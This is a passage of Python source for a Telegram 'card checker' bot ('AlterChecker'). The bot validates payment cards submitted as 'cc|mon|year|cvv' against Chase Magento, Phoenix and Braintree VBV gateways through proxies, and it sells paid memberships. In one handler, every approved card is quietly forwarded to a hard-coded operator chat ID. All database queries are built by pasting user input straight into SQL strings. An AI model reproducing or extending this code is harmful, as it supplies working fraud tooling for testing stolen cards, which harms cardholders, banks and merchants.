    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDsaf import ChaseMagento
        CheckRecive = await ChaseMagento(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
            await bot.send_message(chat_id=5673835413, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["ph"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Phoenix [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Phoenix [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Phoenix [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('ph')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDph import ChaseAuth
        CheckRecive = await ChaseAuth(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["vbv"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Braintree [ VBV ]'
    TwoNameGateway = 'Gateway ↯ Braintree [ VBV ]'
    ThreeGateway = 'Gateway 🔥 Braintree [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('vbv')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
